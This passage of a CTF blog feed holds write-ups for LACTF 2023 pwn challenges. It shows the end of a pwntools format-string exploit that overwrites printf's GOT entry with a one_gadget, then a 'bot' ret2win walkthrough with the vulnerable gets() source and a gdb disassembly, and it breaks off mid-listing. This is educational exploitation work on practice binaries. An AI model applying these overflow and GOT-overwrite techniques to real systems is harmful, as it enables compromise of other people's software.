</span></span><span style="display:flex;"><span>        exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;printf&#39;</span>]:one_gadget
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">8</span>, writes)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>We can make sure that it works:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/220987066-220419b3-d8c3-4fd2-97e5-745f98a78f1f.png" alt="2023-02-23-183836_1888x1030_scrot"></p>
<p>And it does, gg!</p>
<p><em>flag -&gt; lactf{printf_gave_me_up_and_let_me_down}</em></p>
]]></content>
        </item>
        
        <item>
            <title>🇬🇧 LACTF 2023 - pwn/bot</title>
            <link>/posts/2023/02/lactf-2023-pwn/bot/</link>
            <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/02/lactf-2023-pwn/bot/</guid>
            <description>Note Second pwn challenge from the LACTF 2023. Basic ret2win with a little twist: bypassing a condition to prevent the program from exiting&amp;hellip;
Description I made a bot to automatically answer all of your questions. Dockerfile, libc-2.31.so, ld-2.31.so, bot.c, bot
File information before doing all of that, we run pwninit to patch the binary with the given libc and ld
checksec bot_patched &amp;amp;&amp;amp; file bot_patched [*] &amp;#39;/home/conflict/ctfs/lactf2023/bot/bot_patched&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: &amp;#39;.</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Second <code>pwn</code> challenge from the <code>LACTF 2023</code>. Basic <code>ret2win</code> with a little twist: bypassing a condition to prevent the program from exiting&hellip;</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>I made a bot to automatically answer all of your questions.
</span></span></code></pre></div><p><a href="https://lactf-challs.storage.googleapis.com/uploads/71a24c7af5b65f1b28fbc60904e82f6a59beac87d2fa349fcd5284105a558cf2/Dockerfile"><code>Dockerfile</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/263e55f639b540a00fc87e7fdc10078c1cbe89e148ea440ad1a9cef1cbd53c6f/libc-2.31.so"><code>libc-2.31.so</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/4325e436d7b281490848dfb580f16844adcf31afedf3972e12a660abe5c057c2/ld-2.31.so"><code>ld-2.31.so</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/cae1f131aabcdf137b27331c5193d8f32d028b05668a57a1df239222e3eeff99/bot.c"><code>bot.c</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/006a2e73644835158dc097d4eff75ab978a20ffe92c1ce4f534536c41080a7ea/bot"><code>bot</code></a></p>
<h2 id="file-information">File information</h2>
<p><em>before doing all of that, we run <code>pwninit</code> to patch the binary with the given <code>libc</code> and <code>ld</code></em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">bot_patched</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">file</span> <span style="color:#f92672">bot_patched</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ctfs/lactf2023/bot/bot_patched&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x3ff000</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RUNPATH</span><span style="color:#f92672">:</span>  <span style="color:#e6db74">&#39;.&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">bot_patched</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">./</span><span style="color:#f92672">ld-2</span>.<span style="color:#a6e22e">31</span>.<span style="color:#a6e22e">so</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">1ed799aea3b8082b9dadde68dd67684e6101badc</span><span style="color:#f92672">,</span> <span style="color:#f92672">with</span> <span style="color:#f92672">debug_info</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>So, we&rsquo;re going to work on a 64 bits non-stripped dynamically linked executable, with <code>NX</code> enabled, but it&rsquo;s not a problem for us since we&rsquo;re not going to use a shellcode.</p>
<p>For the source code, there is no need to decompile the file or to struggle with some pseudo-code because we have the <code>.c</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">64</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> give_flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;hi, how can i help?&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(input);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;give me the flag&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;lol no&#34;</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;please give me the flag&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;no&#34;</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;help, i have no idea how to solve this&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;L&#34;</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;may i have the flag?&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;not with that attitude&#34;</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;please please please give me the flag&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;i&#39;ll consider it&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">15</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (give_flag) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;ok here&#39;s your flag&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat flag.txt&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;no&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;sorry, i didn&#39;t understand your question&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
<p>Looking at the <code>C</code> code, we see that the program creates a buffer of <code>64 bytes</code> for our input, they reads with <code>gets()</code>. As a reminder, <strong>this function is dangerous and should never be used</strong> because it doesn&rsquo;t allow you to check the length of the user input.</p>
<p>We have our entry point, but we have one last problem: If none of the comparaisons under the <code>gets()</code> is <code>true</code>, the program will exit and never <code>return</code>, so overwriting <code>rip</code> is useless because it will never jump back to it.</p>
<p>So we will enter &ldquo;<em>give me the flag</em>&rdquo; followed by a <code>null byte</code> and our payload. The <code>null byte</code> will stop the string and allow us to bypass the <code>strcmp</code>.</p>
<p>We now have two things to do: finding out the <code>offset</code> to overwrite <code>rip</code>&rsquo;s save, and finding out where we want to jump to print the flag.</p>
<p>To find out the offset, we can just take a look at the code again:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">64</span>];
</span></span></code></pre></div><p>This is the first variable initialised in the program so it will be the closest from <code>rbp</code> (and thus from <code>rip</code> since <code>rbp</code> is just before). It is <code>64 bytes</code> long so the 65th byte of our input should end up in <code>rbp</code>, and the 73rd (<code>64+8+1</code>) byte should end up in <code>rip</code>. Now, remember that we are not only sending junk, so we have to substract the length of the sentence to this offset.</p>
<p>Then knowing where to jump is just as easy. We&rsquo;re going to use <code>gdb</code> to disassemble the main function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401182</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401183</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401186</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: sub    rsp,<span style="color:#ae81ff">0x50</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040118a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2ecf</span>]        <span style="color:#75715e"># 0x404060 &lt;stdout@GLIBC_2.2.5&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401191</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;</span>:  mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401196</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401199</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x401040</span> <span style="color:#f92672">&lt;</span>setbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040119e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:  mov    DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x44</span>],<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011a5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">35</span><span style="color:#f92672">&gt;</span>:  lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe5c</span>]        <span style="color:#75715e"># 0x402008</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011ac</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">42</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">47</span><span style="color:#f92672">&gt;</span>:  lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011b5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">51</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011b8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x401070</span> <span style="color:#f92672">&lt;</span>gets<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011bd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011c1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">63</span><span style="color:#f92672">&gt;</span>:  lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe54</span>]        <span style="color:#75715e"># 0x40201c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011c8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">70</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011cb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x401060</span> <span style="color:#f92672">&lt;</span>strcmp<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011d0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">78</span><span style="color:#f92672">&gt;</span>:  test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011d2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:  jne    <span style="color:#ae81ff">0x4011e5</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">99</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011d4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:  lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe52</span>]        <span style="color:#75715e"># 0x40202d</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011db</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011e0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">94</span><span style="color:#f92672">&gt;</span>:  jmp    <span style="color:#ae81ff">0x4012cc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011e5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">99</span><span style="color:#f92672">&gt;</span>:  lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011e9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">103</span><span style="color:#f92672">&gt;</span>: lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe44</span>]        <span style="color:#75715e"># 0x402034</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011f0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">110</span><span style="color:#f92672">&gt;</span>: mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011f3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">113</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401060</span> <span style="color:#f92672">&lt;</span>strcmp<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011f8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">118</span><span style="color:#f92672">&gt;</span>: test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011fa</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">120</span><span style="color:#f92672">&gt;</span>: jne    <span style="color:#ae81ff">0x40120d</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">139</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011fc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">122</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe49</span>]        <span style="color:#75715e"># 0x40204c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401203</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">129</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401208</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">134</span><span style="color:#f92672">&gt;</span>: jmp    <span style="color:#ae81ff">0x4012cc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040120d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">139</span><span style="color:#f92672">&gt;</span>: lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401211</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">143</span><span style="color:#f92672">&gt;</span>: lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe38</span>]        <span style="color:#75715e"># 0x402050</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401218</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">150</span><span style="color:#f92672">&gt;</span>: mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040121b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">153</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401060</span> <span style="color:#f92672">&lt;</span>strcmp<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401220</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">158</span><span style="color:#f92672">&gt;</span>: test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401222</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">160</span><span style="color:#f92672">&gt;</span>: jne    <span style="color:#ae81ff">0x401235</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">179</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401224</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">162</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe4c</span>]        <span style="color:#75715e"># 0x402077</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040122b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">169</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401230</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">174</span><span style="color:#f92672">&gt;</span>: jmp    <span style="color:#ae81ff">0x4012cc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401235</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">179</span><span style="color:#f92672">&gt;</span>: lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401239</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">183</span><span style="color:#f92672">&gt;</span>: lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe39</span>]        <span style="color:#75715e"># 0x402079</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401240</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">190</span><span style="color:#f92672">&gt;</span>: mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401243</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">193</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401060</span> <span style="color:#f92672">&lt;</span>strcmp<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401248</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">198</span><span style="color:#f92672">&gt;</span>: test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040124a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">200</span><span style="color:#f92672">&gt;</span>: jne    <span style="color:#ae81ff">0x40125a</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">216</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040124c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">202</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe3b</span>]        <span style="color:#75715e"># 0x40208e</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401253</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">209</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401258</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">214</span><span style="color:#f92672">&gt;</span>: jmp    <span style="color:#ae81ff">0x4012cc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040125a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">216</span><span style="color:#f92672">&gt;</span>: lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040125e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">220</span><span style="color:#f92672">&gt;</span>: lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe43</span>]        <span style="color:#75715e"># 0x4020a8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401265</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">227</span><span style="color:#f92672">&gt;</span>: mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401268</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">230</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401060</span> <span style="color:#f92672">&lt;</span>strcmp<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040126d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">235</span><span style="color:#f92672">&gt;</span>: test   eax,eax
